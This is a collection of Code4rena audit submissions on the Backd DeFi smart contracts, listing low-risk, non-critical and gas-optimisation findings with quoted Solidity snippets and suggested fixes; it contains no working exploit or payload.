# Lines of code  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/swappers/SwapperRouter.sol#L140 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/swappers/SwapperRouter.sol#L280   # Vulnerability details  ## Impact   Usage of deprecated transfer  Swap can revert.   ## Proof of Concept  The original `transfer` used to send eth uses a fixed stipend 2300 gas.   This was used to prevent reentrancy.   However this limit your protocol to interact with others contracts that need more than that to proceess the transaction A good article about that https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/  ## Recommended Mitigation Steps  Used call instead.  For example          (bool success, ) = msg.sender.call{amount}("");         require(success, "Transfer failed.");  
**Table of Contents:**  - [[L-01] Unsafe casting may overflow](#l-01-unsafe-casting-may-overflow) - [[L-02] Add constructor initializers](#l-02-add-constructor-initializers) - [[L-03] Deprecated safeApprove() function](#l-03-deprecated-safeapprove-function) - [[L-04] Deprecated approve() function](#l-04-deprecated-approve-function) - [[L-05] Lack of event emission after critical `initialize()` functions](#l-05-lack-of-event-emission-after-critical-initialize-functions) - [[L-06] No account existence check for low-level call](#l-06-no-account-existence-check-for-low-level-call) - [[L-07] `abi.encodePacked()` should not be used with dynamic types when passing the result to a hash function such as `keccak256()`](#l-07-abiencodepacked-should-not-be-used-with-dynamic-types-when-passing-the-result-to-a-hash-function-such-as-keccak256) - [[N-01] Unused named returns](#n-01-unused-named-returns)  ## [L-01] Unsafe casting may overflow  SafeMath and Solidity 0.8.* handles overflows for basic math operations but not for casting. Consider using OpenZeppelin's SafeCast library to prevent unexpected overflows when casting from uint256 here:  ```solidity protocol/contracts/tokenomics/AmmConvexGauge.sol:   208:         ammLastUpdated = uint48(block.timestamp);  protocol/contracts/tokenomics/AmmGauge.sol:    41:         ammLastUpdated = uint48(block.timestamp);   150:         ammLastUpdated = uint48(block.timestamp);  protocol/contracts/tokenomics/KeeperGauge.sol:    49:         lastUpdated = uint48(block.timestamp);   115:         lastUpdated = uint48(block.timestamp); ```  ## [L-02] Add constructor initializers  As per [OpenZeppelin’s (OZ) recommendation](https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680/6), “The guidelines are now to make it impossible for *anyone* to run `initialize` on an implementation contract, by adding an empty constructor with the `initializer` modifier. So the implementation contract gets initialized automatically upon deployment.”  Note that this behaviour is also incorporated the [OZ Wizard](https://wizard.openzeppelin.com/) since the UUPS vulnerability discovery: “Additionally, we modified the code generated by the [Wizard 19](https://wizard.openzeppelin.com/) to include a constructor that automatically initializes the implementation when deployed.”  Furthermore, this thwarts any attempts to frontrun the initialization tx of these contracts:  - File: AddressProvider.sol  ```solidity 47:     constructor(address treasury) { 48:         AddressProviderMeta.Meta memory meta = AddressProviderMeta.Meta(true, false); 49:         _addressKeyMetas.set(AddressProviderKeys._TREASURY_KEY, meta.toUInt()); 50:         _setConfig(AddressProviderKeys._TREASURY_KEY, treasury); 51:     } 52:  53:     function initialize(address roleManager) external initializer { 54:         AddressProviderMeta.Meta memory meta = AddressProviderMeta.Meta(true, true); 55:         _addressKeyMetas.set(AddressProviderKeys._ROLE_MANAGER_KEY, meta.toUInt()); 56:         _setConfig(AddressProviderKeys._ROLE_MANAGER_KEY, roleManager); 57:     } ```  - File: LpToken.sol  ```solidity 26:     constructor() ERC20Upgradeable() {} 27:  28:     function initialize( 29:         string calldata name_, 30:         string calldata symbol_, 31:         uint8 decimals_, 32:         address _minter 33:     ) external override initializer returns (bool) { 34:         require(_minter != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); 35:         __ERC20_init(name_, symbol_); 36:         _decimals = decimals_; 37:         minter = _minter; 38:         return true; 39:     } ```  - File: StakerVault.sol  ```solidity 61:     constructor(IController _controller) 62:         Authorization(_controller.addressProvider().getRoleManager()) 63:     { 64:         controller = _controller; 65:         IInflationManager inflationManager_ = controller.inflationManager(); 66:         require(address(inflationManager_) != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); 67:         inflationManager = inflationManager_; 68:         addressProvider = _controller.addressProvider(); 69:     } 70:  71:     function initialize(address _token) external override initializer { 72:         token = _token; 73:     } ```  ## [L-03] Deprecated safeApprove() function  Using this deprecated function can lead to unintended reverts and potentially the locking of funds. A deeper discussion on the deprecation of this function is in OZ issue #2219 (OpenZeppelin/openzeppelin-contracts#2219). The OpenZeppelin ERC20 safeApprove() function has been deprecated, as seen in the comments of the OpenZeppelin code.  As recommended by the OpenZeppelin comment, I suggest replacing safeApprove() with safeIncreaseAllowance() or safeDecreaseAllowance() instead:  ```solidity protocol/contracts/CvxCrvRewardsLocker.sol:   57:         IERC20(CRV).safeApprove(CRV_DEPOSITOR, type(uint256).max);   60:         IERC20(CVX_CRV).safeApprove(CVX_CRV_STAKING, type(uint256).max);   63:         IERC20(CRV).safeApprove(CVX_CRV_CRV_CURVE_POOL, type(uint256).max);   66:         IERC20(CVX).safeApprove(CVX_LOCKER, type(uint256).max);  protocol/contracts/RewardHandler.sol:   52:         IERC20(targetLpToken).safeApprove(address(bkdLocker), burnedAmount);   64:         IERC20(token).safeApprove(spender, type(uint256).max);  protocol/contracts/tokenomics/AmmConvexGauge.sol:   61:         IERC20(ammToken).safeApprove(booster, type(uint256).max);  protocol/contracts/tokenomics/FeeBurner.sol:   118:         IERC20(token_).safeApprove(spender_, type(uint256).max);  protocol/contracts/zaps/PoolMigrationZap.sol:   27:             IERC20(underlying_).safeApprove(address(newPool_), type(uint256).max); ```  ## [L-04] Deprecated approve() function  While `safeApprove()` in itself is deprecated, it is still better than `approve` which is subject to a known front-running attack and failing for certain token implementations that do not return a boolean value. Consider using `safeApprove` instead (or better: `safeIncreaseAllowance()`/`safeDecreaseAllowance()`):  ```solidity File: VestedEscrow.sol 24:     constructor(address rewardToken_) { 25:         IERC20(rewardToken_).approve(msg.sender, type(uint256).max); 26:     } ```  ## [L-05] Lack of event emission after critical `initialize()` functions  To record the init parameters for off-chain monitoring and transparency reasons, please consider emitting an event after the `initialize()` functions:  - File: AddressProvider.sol  ```solidity 53:     function initialize(address roleManager) external initializer { 54:         AddressProviderMeta.Meta memory meta = AddressProviderMeta.Meta(true, true); 55:         _addressKeyMetas.set(AddressProviderKeys._ROLE_MANAGER_KEY, meta.toUInt()); 56:         _setConfig(AddressProviderKeys._ROLE_MANAGER_KEY, roleManager); 57:     } ```  - File: BkdLocker.sol  ```solidity 53:     function initialize( 54:         uint256 startBoost, 55:         uint256 maxBoost, 56:         uint256 increasePeriod, 57:         uint256 withdrawDelay 58:     ) external override onlyGovernance { 59:         require(currentUInts256[_START_BOOST] == 0, Error.CONTRACT_INITIALIZED); 60:         _setConfig(_START_BOOST, startBoost); 61:         _setConfig(_MAX_BOOST, maxBoost); 62:         _setConfig(_INCREASE_PERIOD, increasePeriod); 63:         _setConfig(_WITHDRAW_DELAY, withdrawDelay); 64:     } ```  - File: LpToken.sol  ```solidity 28:     function initialize( 29:         string calldata name_, 30:         string calldata symbol_, 31:         uint8 decimals_, 32:         address _minter 33:     ) external override initializer returns (bool) { 34:         require(_minter != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); 35:         __ERC20_init(name_, symbol_); 36:         _decimals = decimals_; 37:         minter = _minter; 38:         return true; 39:     } ```  - File: StakerVault.sol  ```solidity 71:     function initialize(address _token) external override initializer { 72:         token = _token; 73:     } ```  ## [L-06] No account existence check for low-level call  Low-level calls call/delegatecall/staticcall return true even if the account called is non-existent (per EVM design). Account existence must be checked prior to calling.  Consider checking for account-existence before the `call()` to make this safely extendable to user-controlled address contexts in future (or, at least, prevent the `address(0)` entry):  ```solidity File: GasBank.sol 67:     function withdrawFrom( 68:         address account, 69:         address payable to, 70:         uint256 amount 71:     ) public override { 72:         uint256 currentBalance = _balances[account]; 73:         require(currentBalance >= amount, Error.NOT_ENOUGH_FUNDS); 74:         require( 75:             msg.sender == account || addressProvider.isAction(msg.sender), 76:             Error.UNAUTHORIZED_ACCESS 77:         ); 78:  79:         if (msg.sender == account) { 80:             uint256 ethRequired = controller.getTotalEthRequiredForGas(account); 81:             require(currentBalance - amount >= ethRequired, Error.NOT_ENOUGH_FUNDS); 82:         } 83:         _withdrawFrom(account, to, amount, currentBalance); 84:     } 85:  86:     function _withdrawFrom( 87:         address account, 88:         address payable to, 89:         uint256 amount, 90:         uint256 currentBalance 91:     ) internal { 92:         _balances[account] = currentBalance.uncheckedSub(amount); 93:  94:         // solhint-disable-next-line avoid-low-level-calls 95:         (bool success, ) = to.call{value: amount}(""); //@audit can be address(0) 96:         require(success, Error.FAILED_TRANSFER); 97:  98:         emit Withdraw(account, to, amount); 99:     } ```  ## [L-07] `abi.encodePacked()` should not be used with dynamic types when passing the result to a hash function such as `keccak256()`  Use `abi.encode()` instead which will pad items to 32 bytes, which will prevent hash collisions (e.g. `abi.encodePacked(0x123,0x456)` => `0x123456` => `abi.encodePacked(0x1,0x23456)`, but `abi.encode(0x123,0x456)` => `0x0...1230...456`). If there is only one argument to `abi.encodePacked()` it can often be cast to `bytes()` or `bytes32()` instead.  ```solidity protocol/contracts/tokenomics/InflationManager.sol:   627      function _getKeeperGaugeKey(address pool) internal pure returns (bytes32) {   628:         return keccak256(abi.encodePacked(_KEEPER_WEIGHT_KEY, pool));   629      }    631      function _getAmmGaugeKey(address token) internal pure returns (bytes32) {   632:         return keccak256(abi.encodePacked(_AMM_WEIGHT_KEY, token));   633      }    635      function _getLpStakerVaultKey(address vault) internal pure returns (bytes32) {   636:         return keccak256(abi.encodePacked(_LP_WEIGHT_KEY, vault));   637      } ```  ## [N-01] Unused named returns  While not consuming more gas with the Optimizer enabled: using both named returns and a return statement isn't necessary. Removing one of those can improve code clarity:  ```solidity tokenomics/FeeBurner.sol:47:        returns (uint256 received) tokenomics/FeeBurner.sol:98:        returns (uint256 received) ``` 
1. Title : Comment was not the same as actual code  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L112-L129  In the function of removepool(). [`Comment`](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L115) was used to said that :   ```      * @return `true` if successful.  ```  but in [`actual code`](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L128) was :   ```         return removed; ```  So it can be changed as it should be.   ## Tool Used  Manual Review  ## Another Occurances   It happen too in this code :  1.) AddressProvider.sol [Lines247-261](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L247-L261) 2). LpGauge.sol [Lines.48-62](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/LpGauge.sol#L48-L62)   2. Title : Redundant Code `_prepare`  This code was redundant and it could be deleted for better code since it has  [1](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/Preparable.sol#L50-L55) and [2](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/Preparable.sol#L74-L79) with the same fn()  ```     /**      * @notice Same as `_prepare(bytes32,uint256,uint256)` but uses a default delay      */     function _prepare(bytes32 key, uint256 value) internal returns (bool) {         return _prepare(key, value, _MIN_DELAY);     } ```  ## Tool Used  Manual Review   3. Title : NatSpec is incomplete  1.) File : contracts/AddressProvider.sol ([Lines.77-87](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L77-L87))  Missing `@return`  ```     /**      * @notice Adds action.      * @param action Address of action to add.      */     function addAction(address action) external override onlyGovernance returns (bool) {         bool result = _actions.add(action);         if (result) {             emit ActionListed(action);         }         return result;     } ```  2.) File : contracts/BkdLocker.sol ([Lines.77-83](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L77-L83))  Missing `@return`  ```      /**      * @notice Lock gov. tokens.      * @dev The amount needs to be approved in advance.      */     function lock(uint256 amount) external override {         return lockFor(msg.sender, amount);     } ``` 3.) File : contracts/Controller.sol ([Lines.78-84](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/Controller.sol#L78-L84))  Missing `@param amount`  ```     /**      * @notice Prepares the minimum amount of staked BKD required by a keeper      */     function prepareKeeperRequiredStakedBKD(uint256 amount) external override onlyGovernance {         require(addressProvider.getBKDLocker() != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED);         _prepare(_KEEPER_REQUIRED_STAKED_BKD, amount);     } ``` 4.) File : contracts/Controller.sol ([Lines.100-108](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/Controller.sol#L100-L108))  Missing `@param keeper`  ```     /**      * @notice Returns true if the given keeper has enough staked BKD to execute actions      */     function canKeeperExecuteAction(address keeper) external view override returns (bool) {         uint256 requiredBKD = getKeeperRequiredStakedBKD();         return             requiredBKD == 0 ||             IERC20(addressProvider.getBKDLocker()).balanceOf(keeper) >= requiredBKD;     } ``` 5.) File : contracts/Controller.sol ([Lines.118-130](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/Controller.sol#L118-L130))  Missing `@param payer`  ```      * @return the total amount of ETH require by `payer` to cover the fees for      * positions registered in all actions      */     function getTotalEthRequiredForGas(address payer) external view override returns (uint256) {         // solhint-disable-previous-line ordering         uint256 totalEthRequired;         address[] memory actions = addressProvider.allActions();         uint256 numActions = actions.length;         for (uint256 i; i < numActions; i = i.uncheckedInc()) {             totalEthRequired += IAction(actions[i]).getEthRequiredForGas(payer);         }         return totalEthRequired;     } ```  6.) File : contracts/utils/Preparable.sol ([Lines.50-55](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/Preparable.sol#L50-L55))  ```     /**      * @notice Same as `_prepare(bytes32,uint256,uint256)` but uses a default delay      */     function _prepare(bytes32 key, uint256 value) internal returns (bool) {         return _prepare(key, value, _MIN_DELAY);     } ```  7.) File :  contracts/utils/Preparable.sol ([Lines.74-79](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/Preparable.sol#L74-L79))    ```      /**      * @notice Same as `_prepare(bytes32,address,uint256)` but uses a default delay      */     function _prepare(bytes32 key, address value) internal returns (bool) {         return _prepare(key, value, _MIN_DELAY);     } ```  4. Title : Typo Comment   1.) File : contracts/BkdLocker.sol ([Line.174](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L174))  `invlude` change to `include`  ```      * @dev This does not invlude the gov. tokens queued for withdrawal. ```  2.) File : contracts/AddressProvider.sol ([Line.237](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L237))  `feeze` change into `freeze`  ```      * @param key Key to feeze ``` 5. Title : simplify the number of `_MAX_SUPPLY`  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/CvxMintAmount.sol#L12  ```   uint256 private constant _MAX_SUPPLY = 100000000 * 1e18; //100 mil max supply ```  changed to :  ``` uint256 private constant _MAX_SUPPLY =  1e26 //100mil ```   
## Low ### IERC20.approve might revert for some token Some token return void in approve and will revert if the IERC20 interface is used. Consider using OZ's safeApprove https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L25-L26  ```solidity         IERC20(rewardToken_).approve(msg.sender, type(uint256).max);  ```  ### Hardcoded WETH address WETH address might change if deployed on L2 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L25-L26  ```solidity     address private constant _WETH = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2); // WETH  ```
## `> 0` is less efficient than `!= 0` for uint in require condition Ref: https://twitter.com/GalloDaSballo/status/1485430908165443590 ``` protocol/contracts/tokenomics/AmmConvexGauge.sol:158:        require(amount > 0, Error.INVALID_AMOUNT); protocol/contracts/tokenomics/AmmConvexGauge.sol:171:        require(amount > 0, Error.INVALID_AMOUNT); protocol/contracts/tokenomics/VestedEscrow.sol:84:        require(unallocatedSupply > 0, "No reward tokens in contract"); protocol/contracts/tokenomics/KeeperGauge.sol:140:        require(totalClaimable > 0, Error.ZERO_TRANSFER_NOT_ALLOWED); protocol/contracts/tokenomics/AmmGauge.sol:104:        require(amount > 0, Error.INVALID_AMOUNT); protocol/contracts/tokenomics/AmmGauge.sol:125:        require(amount > 0, Error.INVALID_AMOUNT); ```  ## Float multiplication optimization We can use the following function to save gas on float multiplications ``` // out = x * y unchecked{/} z function fmul(uint256 x, uint256 y, uint256 z) internal pure returns(uint256 out){ assembly{ if iszero(eq(div(mul(x,y),x),y)) {revert(0,0)} out := div(mul(x,y),z) } } ```  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L156-L157  ```solidity         return Math.min((locked * elapsed) / totalTime, locked);  ```
# Lines of code  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L227-L232   # Vulnerability details  ## Impact function `lockFor()`  in `BkdLocker` is supposed to lock 'msg.sender` funds and increase `user` address funds but if anyone one calls it with `0x0` address by mistake then his funds will be locked forever.  ## Proof of Concept This is `lockFor()` code in `BkdLocker`: ```     function lockFor(address user, uint256 amount) public override {         govToken.safeTransferFrom(msg.sender, address(this), amount);         _userCheckpoint(user, amount, balances[user] + amount);         totalLocked += amount;         emit Locked(user, amount);     } ``` As you can see there is no check that `user` is not `0x0`. code calls `_userCheckpoint()` which will increase `0x0` balances in the contract and there is no check in `_userCheckpoint()` either and user can lose all his funds just by one simple mistake.  ## Tools Used VIM  ## Recommended Mitigation Steps check that `user` is not `0x0` in `lcokFor`  
1. "!=" instead of ">"  ## POC https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/AmmConvexGauge.sol#L158  ## Impact != 0 better than use > 0 to safe gas.  2. Chached array  ## POC https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/RewardHandler.sol#L42  ## Impact chached array length "pool.length" to save gas.
1. Reentrancy issue in a function The functions below have an external call which can allow user to reenter into the function. Although reentering the function would cause harm to the caller than good.  **Occurrences in: *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L130-L134 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L108-L111  --------------------------------------- 2. Missing events and emit Certain events and emits are necessary for core changes and admin/critical activities to allow monitoring on third party tools. The following below are missing;  **Occurrences in: *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L68 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L74 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/Minter.sol#L99  --------------------------------- 3.. Missing zero address check The following are missing checks for existence of zero address which may lead to transfers to zero address or causing some functions to no longer be accessible.  **Occurrences in: *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L124 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L56 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L103 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#L70 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L31 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L31 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/StakerVault.sol#L111 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/StakerVault.sol#L139 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/StakerVault.sol#L359 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/Minter.sol#L126 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/Minter.sol#L144 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L65   --------------------------------------- 4.  Use of Deprecated safeApprove() function The OpenZeppelin ERC20 SafeApprove() function has been deprecated, replace safeApprove() with safeIncreaseAllowance() or safeDecreaseAllowance() instead.  **Occurrences in: *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/RewardHandler.sol#L52 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/RewardHandler.sol#L64 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L118 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/zaps/PoolMigrationZap.sol#L27   ----------------------------------------  5. Max approvals are risky Maximum approvals are widely considered as unsafe if the approved contract becomes compromised/malicious.  **Occurrences in: *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/RewardHandler.sol#L64 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L118    --------------------------------- 6.. Costly external calls in a loop *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/Controller.sol#L127 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/RewardHandler.sol#L44 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/RewardHandler.sol#L44 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L70 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L99 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L102   --------------------------------------------  7. Use of unsafe approve() https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L25                 
# 1. ```AddressProvider.sol``` does not have a ```getSwapperRouter``` function  ## Line References  [FeeBurner.sol#L126](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L126)  [AddressProvider.sol]()  ## Impact  In ```FeeBurner.sol```, the ```_swapperRouter``` function gets the swapper router from the address provider. The ```AddressProvider.sol``` and ```IAddressProvider.sol``` contracts do not seem to have a ```getSwapperRouter``` function. If the ```_addressProvider``` in ```FeeBurner.sol``` is the ```AddressProvider.sol``` contract or implements ```IAddressProvider.sol``` then ```FeeBurner.sol``` would not function correctly or at all.  ## Proof of concept  The [_swapperRouter](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L54) function is called in the ```burnToTarget``` function which should then revert thus making ```burnToTarget``` uncallable.  ## Recommended Mitigation Steps  Add the ```getSwapperRouter``` function in the ```AddressProvider.sol``` and ```IAddressProvider.sol``` contracts.     # 2. Incompatibility with deflationary/rebase/fee-on-transfer tokens in ```FeeBurner.sol```  ## Line References  [FeeBurner.sol#L85](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L85)  ## Impact  In the ```burnToTarget``` function of ```FeeBurner.sol```, if the tokens being transferred are tokens whose balances change during a transfer such as deflationary and fee-on-transfer tokens, then the swap could fail since the swap input amount might be larger than the actual amount of tokens received in ```FeeBurner.sol```.  ## Recommended Mitigation Steps  When tokens are [transferred to the contract](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L70), check the balance of the contract before and after the transfer. Use the difference in the balances as the input amount for the swap call.     # 3. Return value for ```mint``` is not checked in ```InflationManager.sol```  ## Line References  [InflationManager.sol#L81](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L81)  [Minter.sol#L126-L135](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/Minter.sol#L126-L135)  ## Impact  In ```Minter.sol```, if inflation has not started and ```lastEvent == 0``` then the ```mint``` function will return false. In ```InflationManager.sol```, the ```mintRewards``` function does not check the return value for the mint call. When ```mintRewards``` is called by a gauge and fails, the transaction does not revert.  ## Proof of Concept  When calling ```claimRewards``` in ```AmmGauge.sol```, the call to ```mintRewards``` does not revert if minting has failed and the user loses their rewards.   ```     function claimRewards(address beneficiary) external virtual override returns (uint256) {         require(             msg.sender == beneficiary || _roleManager().hasRole(Roles.GAUGE_ZAP, msg.sender),             Error.UNAUTHORIZED_ACCESS         );         _userCheckpoint(beneficiary);         uint256 amount = perUserShare[beneficiary];         if (amount <= 0) return 0;         perUserShare[beneficiary] = 0;         controller.inflationManager().mintRewards(beneficiary, amount);         emit RewardClaimed(beneficiary, amount);         return amount;     } ```  The ```KeeperGauge.sol``` and ```LpGauge.sol``` contracts would fail in a similar way in addition to any other gauges that call ```mintRewards```.  ## Recommended Mitigation Steps  Consider either returning a bool value for the ```mintRewards``` function in ```InflationManager.sol``` and check the return value in the gauges or insert the mint call in a require,   ```require(Minter(minter).mint(beneficiary, amount))```
## [G-01] Unnecessary less than check `amount` is a UINT and therefore can not be less than 0. Change `<=` to `==`  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/LpGauge.sol#L59
## [L-01] Inconsistency in event emissions Events are emitted at the beginning vs end of the function execution. Temporary variables are/aren't used in the event emission call.  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/Preparable.sol#L140-L154  ## [L-02] Code vs comment conflict: Backwards imp. of “safe” The "safe" function is not the safe version. The unsafe version is the one that reverts in unsuccessful.  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L307-L327  ## [L-03] Use of deprecated SafeApprove() `SafeApprove()` has been deprecated according to OpenZeppelin.  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L118  ## [L-04] Improper ownership transfer It is recommended to make ownership transfer a two-step process where you firstly set a pending owner address and then accept the pending owner in a second call.  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L68-L72  ## [L-05] Missing event emissions on important setter functions https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmConvexGauge.sol#L86-L96  ## [L-06] Missing address(0) checks on important functions https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L227-L232 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L322 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L381 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L146 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L131  ## [N-01] Inconsistency in using modifier Sometimes modifier is used. Sometimes require statement is used.  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L57 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L50  ## [N-02] Typo in "an" https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L66
  if just reading the constant it still costs gas .to make it less gas make it a smaller  bytes10 then bytes32 because  1 char =1 byte each byte less saves gas.    bytes32 internal constant _START_BOOST = "startBoost";    bytes32 internal constant _MAX_BOOST = "maxBoost";    bytes32 internal constant _INCREASE_PERIOD = "increasePeriod";    bytes32 internal constant _WITHDRAW_DELAY = "withdrawDelay"; https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/BkdLocker.sol#L21-L24 https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/Controller.sol#L25   https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L25-L28   Use Custom Errors instead of Revert Strings to save Gas Custom errors from Solidity 0.8.4 are cheaper than revert strings (cheaper deployment cost and runtime cost when the revert condition is met) Source Custom Errors in Solidity: Starting from Solidity v0.8.4, there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., revert("Insufficient funds.");), but they are rather expensive, especially when it comes to deploy cost, and it is 